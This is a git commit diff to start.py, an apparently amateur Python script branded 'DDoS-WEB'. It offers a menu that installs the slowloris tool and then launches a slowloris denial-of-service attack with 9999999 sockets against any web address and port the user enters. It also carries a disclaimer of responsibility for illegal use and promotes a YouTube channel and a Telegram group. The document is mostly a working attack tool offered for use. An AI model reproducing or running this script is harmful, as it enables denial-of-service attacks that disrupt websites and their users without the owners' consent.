bc446878f54d7863dbb209aaa0ecf8932adf342b
Raz Ahamed <100101605+Raz-Ahamed@users.noreply.github.com>
2023-03-19 18:03:19 +0600

    Update start.py

--- start.py
+++ start.py
@@ -9,16 +9,17 @@ purple="\033[0;35m"       # Purple
 cyan="\033[0;36m"         # Cyan
 white="\033[0;37m"        # White
 os.system('clear')
-print(green+'''
--------
-|°°°°°|
-|°°°°°|>>>>>>>>> [DDoS]
-|°°°°°|
--------
-''')
+import  os 
+os.system('clear')
+os.system('figlet -f big DDoS-WEB |lolcat')
+print(green+'                     Version : 2.0 ')
+print()
 print(blue+'======================================================')
 print(red+'Note: I wont be responsible fo any illigal activites.')
 print(blue+'======================================================')
+print()
+#main.coding
+#________________________________________
 import os
 import sys
 import time
@@ -27,38 +28,95 @@ def delay_print(s):
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(0.10)
-delay_print(green+'%37s' % '   |Devoloped By : Raz Ahamed|\n') 
-print(red+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
-print(blue+'Youtube Chanel: Real tips and Trikes 660')
-print(blue+'Telegarm Grop : https://t.me/realtips660')
-print(red+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+delay_print(green+'%37s' % '   |Devoloped By : Raz Ahamed|\n')
+print()
+print(red+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+print(blue+'Youtube Chanel: Real  tips and Trikes 660')
+print(blue+'Telegarm Grop : https://t.me/realtips6600')
+print(red+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
+print()
 print('[1] Update')
 print('[2] Attck')
 print('[3] Back')
 print('')
-a=str(input('Selected Option-: '))
+a=str(input(cyan+'Selected Option-: '))
 if a=='1':
 	import os
-	print(red+'update...')
+	import sys
+	import time
+	def delay_print(s):
+	    for c in s:
+	        sys.stdout.write(c)
+	        sys.stdout.flush()
+	        time.sleep(0.10)
+	delay_print(red+'Update......')
 	os.system('apt update -y')
-	os.system('apt install python -y')
+	os.system('apt install ruby -y')
+	os.system('apt install figlet -y')
+	os.system('gem install lolcat')
 	os.system('pip install slowloris')
 	os.system('clear')
-	print('Update successfull')
-	os.system('python real-start.py')
+	import sys
+	import time
+	def delay_print(s):
+	    for c in s:
+	        sys.stdout.write(c)
+	        sys.stdout.flush()
+	        time.sleep(0.10)
+	delay_print(green+'Update successfull.....')
+	
+	os.system('python3 start.py')
 elif a=='2':
     #slowloris -s 500 -p 80 192.168.1.254
 	import os
 	print('')
-	x=input('Enter Web link -: ')
-	z=input('Enter Port-: ')
+	x=input(green+'Enter Web link -: ')
+	print('')
+	z=input(yellow+'Enter Port-: ')
+	print()
 	i=' '+x
 	m=z+i
-	print(red+'Type CTRL+c Stop')
+	def delay_print(s):
+	    for c in s:
+	        sys.stdout.write(c)
+	        sys.stdout.flush()
+	        time.sleep(0.10)
+	delay_print(cyan+'Type CTRL+c Stop')
 	print(green+'Attck Start.......')
 	os.system('slowloris -s 9999999 -p '+m)
+	print()
+	are=str(input(cyan+'Are you continue (y/n):- '))
+	if are=='y':
+		os.system('python3 start.py')
+	elif are=='n':
+		os.system('exit')
+		os.system('clear')
+		os.system('figlet -f big Thanks |lolcat')
+	elif are=='y ':
+		os.system('python3 start.py')
+	elif are=='n ':
+		os.system('exit')
+		os.system('clear')
+		os.system('figlet -f big Thanks |lolcat')
+	else:
+		print()
+		def delay_print(s):
+		    for c in s:
+		        sys.stdout.write(c)
+		        sys.stdout.flush()
+		        time.sleep(0.10)
+		delay_print(red+'Wrong Input Agin!')
+		os.system('python3 start.py')
 elif a=='3':
 	os.system('exit')
+	os.system('clear')
+	os.system('figlet -f big Thanks |lolcat')
 else:
-    print(red+'erro!')
-    os.system('python start.py')
+	print()
+	def delay_print(s):
+	    for c in s:
+	        sys.stdout.write(c)
+	        sys.stdout.flush()
+	        time.sleep(0.10)
+	delay_print(red+'Wrong Input Agin!')
+	os.system('python3 start.py')
